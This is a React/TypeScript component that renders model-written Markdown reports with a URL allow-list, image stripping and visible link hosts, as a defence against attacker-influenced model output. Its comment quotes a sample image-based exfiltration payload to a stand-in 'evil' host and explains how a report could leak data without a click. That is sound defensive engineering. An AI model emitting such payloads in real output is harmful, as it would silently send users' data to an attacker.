"use client";

import * as React from "react";
import ReactMarkdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import { MermaidDiagram } from "./MermaidDiagram";
import { t } from "@/i18n";
import { extractMermaidBlocks } from "@/lib/report/mermaid";

/**
 * Which link targets a report may carry (D-165). Anything else is returned empty, which
 * react-markdown renders as an inert element: `javascript:`, `data:`, `file:`, `http:` and
 * protocol-relative URLs are all dropped. A same-document `#anchor` and a `mailto:` are allowed.
 *
 * The report is built from model output that quotes participants, so a link or an image in it is
 * attacker-influenced text. An image would make the administrator's browser fetch an attacker's
 * URL the moment the page rendered (`![](https://evil/p?d=...)`), which is a data-exfiltration
 * channel with no click involved; images are removed, not rewritten.
 */
export function safeUrl(url: string): string {
  const trimmed = url.trim();
  if (trimmed.startsWith("#")) return trimmed;
  try {
    const parsed = new URL(trimmed);
    if (parsed.protocol === "https:" || parsed.protocol === "mailto:") return trimmed;
  } catch {
    // relative or malformed: not a thing a report should link to
  }
  return "";
}

const components: Components = {
  // A table wider than the paper scrolls inside its own region, which a keyboard can reach.
  table({ children }) {
    return (
      <div
        className="report-table"
        tabIndex={0}
        role="region"
        aria-label={t.kit.table.region(t.admin.report.title)}
      >
        <table>{children}</table>
      </div>
    );
  },
  a({ href, children }) {
    const target = href ?? "";
    if (target === "") return <span>{children}</span>;
    const text = typeof children === "string" ? children : "";
    let host = "";
    try {
      host = new URL(target).host;
    } catch {
      host = "";
    }
    // Where a link really goes is shown unless the visible text already says so: link text that
    // names a different place than the link is how a phishing link looks harmless.
    const showHost = host !== "" && !text.includes(host);
    return (
      <>
        <a
          href={target}
          rel="noopener noreferrer nofollow"
          target={target.startsWith("#") ? undefined : "_blank"}
        >
          {children}
        </a>
        {showHost ? <span className="text-muted-foreground"> ({host})</span> : null}
      </>
    );
  },
};

/** GFM Markdown with Mermaid fences rendered as diagrams. No raw HTML, no images, https links only. */
export function ReportMarkdown({ markdown }: { markdown: string }): React.JSX.Element {
  const segments = React.useMemo(() => extractMermaidBlocks(markdown), [markdown]);
  return (
    <div className="report-prose">
      {segments.map((seg, i) =>
        seg.kind === "mermaid" ? (
          <MermaidDiagram key={i} code={seg.code} />
        ) : (
          <ReactMarkdown
            key={i}
            remarkPlugins={[remarkGfm]}
            skipHtml
            disallowedElements={["img"]}
            unwrapDisallowed
            urlTransform={safeUrl}
            components={components}
          >
            {seg.text}
          </ReactMarkdown>
        ),
      )}
    </div>
  );
}
